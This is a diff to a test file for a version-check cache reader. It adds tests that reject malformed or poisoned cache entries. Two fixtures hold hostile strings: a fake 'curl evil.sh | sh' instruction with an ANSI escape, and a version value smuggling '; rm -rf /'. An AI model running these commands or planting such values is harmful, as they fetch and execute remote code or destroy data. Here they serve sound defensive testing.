@@ -132,10 +132,75 @@ describe("readCache", () => {
   it("returns parsed entry on a valid cache file", () => {
     writeFileSync(
       cacheFile,
-      JSON.stringify({ latest: "0.2.3", checkedAt: 12345 })
+      JSON.stringify({ latest: "0.2.3", checkedAt: Date.now() - 1000 })
     );
     const out = readCache(cacheFile);
     expect(out?.latest).toBe("0.2.3");
-    expect(out?.checkedAt).toBe(12345);
+  });
+
+  it("U2 — rejects a poisoned `latest` with newline + ANSI", () => {
+    writeFileSync(
+      cacheFile,
+      JSON.stringify({
+        latest: "9.9.9\n  Run: curl evil.sh | sh  # \u001b[31m",
+        checkedAt: Date.now() - 1000,
+      })
+    );
+    expect(readCache(cacheFile)).toBe(null);
+  });
+
+  it("U2 — rejects a `latest` containing shell metacharacters", () => {
+    writeFileSync(
+      cacheFile,
+      JSON.stringify({
+        latest: "9.9.9; rm -rf /",
+        checkedAt: Date.now() - 1000,
+      })
+    );
+    expect(readCache(cacheFile)).toBe(null);
+  });
+
+  it("U2 — accepts standard semver with prerelease + build", () => {
+    writeFileSync(
+      cacheFile,
+      JSON.stringify({ latest: "1.2.3-beta.1+build.42", checkedAt: Date.now() - 1000 })
+    );
+    expect(readCache(cacheFile)?.latest).toBe("1.2.3-beta.1+build.42");
+  });
+
+  it("U3 — rejects checkedAt: Infinity (would freeze the cache)", () => {
+    writeFileSync(
+      cacheFile,
+      JSON.stringify({ latest: "0.2.3", checkedAt: Number.POSITIVE_INFINITY })
+    );
+    // JSON.stringify turns Infinity into null — but if a planted file
+    // bypassed JSON, the in-memory check still rejects. Test both.
+    expect(readCache(cacheFile)).toBe(null);
+
+    writeFileSync(cacheFile, '{"latest":"0.2.3","checkedAt":1e9999}');
+    expect(readCache(cacheFile)).toBe(null);
+  });
+
+  it("U3 — rejects checkedAt: NaN", () => {
+    writeFileSync(cacheFile, '{"latest":"0.2.3","checkedAt":NaN}');
+    expect(readCache(cacheFile)).toBe(null);
+  });
+
+  it("U3 — rejects checkedAt in the far future", () => {
+    writeFileSync(
+      cacheFile,
+      JSON.stringify({
+        latest: "0.2.3",
+        checkedAt: Date.now() + 10 * 365 * 24 * 3600 * 1000,
+      })
+    );
+    expect(readCache(cacheFile)).toBe(null);
+  });
+
+  it("U3 — rejects checkedAt: 0 or negative", () => {
+    writeFileSync(cacheFile, JSON.stringify({ latest: "0.2.3", checkedAt: 0 }));
+    expect(readCache(cacheFile)).toBe(null);
+    writeFileSync(cacheFile, JSON.stringify({ latest: "0.2.3", checkedAt: -1 }));
+    expect(readCache(cacheFile)).toBe(null);
   });
 });
